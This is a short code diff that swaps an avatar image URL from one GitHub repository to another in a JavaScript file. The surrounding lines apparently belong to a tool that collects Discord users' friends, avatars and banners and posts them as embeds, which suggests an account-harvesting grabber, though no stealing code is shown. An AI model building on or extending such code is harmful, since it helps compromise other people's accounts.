@@ -79,7 +79,7 @@ const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
   var params = {
     username: "Nova Sentinel",
     avatar_url:
-      "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png",
+      "https://raw.githubusercontent.com/selfbot12345/sub/main/assets/lilnova.png",
     content: "",
     embeds: [
       {
@@ -584,7 +584,7 @@ const FirstTime = async () => {
       var Friends = parseFriends(friends);
       if (!user.avatar)
         var userAvatar =
-          "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png";
+          "https://raw.githubusercontent.com/selfbot12345/sub/main/assets/lilnova.png";
       if (!user.banner)
         var userBanner =
           "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/giphy.gif";
@@ -722,7 +722,7 @@ const FirstTime = async () => {
         var Friends = parseFriends(friends);
         if (!user.avatar)
           var userAvatar =
-            "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png";
+            "https://raw.githubusercontent.com/selfbot12345/sub/main/assets/lilnova.png";
         if (!user.banner)
           var userBanner =
             "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/giphy.gif";
@@ -944,7 +944,7 @@ async function BoukiTuclcavectesfonctions() {
   );
   if (!user.avatar)
     var userAvatar =
-      "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png";
+      "https://raw.githubusercontent.com/selfbot12345/sub/main/assets/lilnova.png";
   if (!user.banner)
     var userBanner =
       "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/giphy.gif";
